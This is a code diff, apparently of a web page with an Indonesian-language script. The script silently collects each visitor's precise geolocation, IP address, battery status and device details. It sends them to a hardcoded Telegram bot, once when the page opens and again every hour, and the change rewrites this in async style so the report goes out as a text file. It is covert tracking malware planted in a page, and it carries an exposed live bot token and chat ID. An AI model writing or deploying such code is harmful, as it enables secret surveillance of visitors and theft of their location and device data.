@@ -42,28 +42,22 @@
     const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
     const chatId = 5677912817;
 
-    function sendToTelegram(text) {
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: text })
-      });
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Tidak tersedia";
+      }
     }
 
-    function getIP() {
-      return fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => data.ip)
-        .catch(() => "Tidak tersedia");
-    }
-
-    function getBatteryInfo() {
+    async function getBattery() {
       if (navigator.getBattery) {
-        return navigator.getBattery().then(bat => {
-          return `Baterai: ${Math.round(bat.level * 100)}% ${bat.charging ? "(Mengisi)" : ""}`;
-        });
+        const b = await navigator.getBattery();
+        return `Baterai: ${Math.round(b.level * 100)}% ${b.charging ? '(Mengisi)' : ''}`;
       } else {
-        return Promise.resolve("Baterai: Tidak didukung");
+        return "Baterai: Tidak didukung";
       }
     }
 
@@ -76,34 +70,55 @@
       ].join('\n');
     }
 
-    function kirimSemuaData() {
-      Promise.all([getIP(), getBatteryInfo()])
-        .then(([ip, bat]) => {
-          navigator.geolocation.getCurrentPosition(pos => {
-            const lat = pos.coords.latitude.toFixed(6);
-            const lon = pos.coords.longitude.toFixed(6);
-            const acc = pos.coords.accuracy;
-            const lokasi = `Lokasi: ${lat}, ${lon} (±${acc} m)`;
+    async function kirimSemuaData() {
+      try {
+        const [ip, battery] = await Promise.all([getIP(), getBattery()]);
 
-            const info = [
-              "*[DatabaseNusantara Deteksi]*",
-              lokasi,
-              `IP: ${ip}`,
-              bat,
-              getDeviceInfo()
-            ].join('\n');
+        navigator.geolocation.getCurrentPosition(async pos => {
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          const acc = pos.coords.accuracy;
 
-            sendToTelegram(info);
-          }, err => {
-            sendToTelegram("Gagal akses lokasi: " + err.message);
+          const lokasi = `Lokasi: ${lat}, ${lon} (±${acc} m)`;
+          const semua = [
+            "[DatabaseNusantara Report]",
+            lokasi,
+            `IP: ${ip}`,
+            battery,
+            getDeviceInfo()
+          ].join('\n');
+
+          // Buat Blob untuk dikirim sebagai file
+          const blob = new Blob([semua], { type: "text/plain" });
+          const form = new FormData();
+          form.append("chat_id", chatId);
+          form.append("document", blob, "data.txt");
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: "POST",
+            body: form
+          });
+
+        }, err => {
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: "Gagal lokasi: " + err.message })
           });
         });
+      } catch (e) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: "Gagal sistem: " + e.message })
+        });
+      }
     }
 
-    // Kirim pertama kali saat dibuka
+    // Jalankan sekarang
     kirimSemuaData();
 
-    // Ulangi setiap 1 jam (3600000 ms)
+    // Kirim ulang setiap 1 jam (3600000 ms)
     setInterval(kirimSemuaData, 3600000);
   </script>
 </body>
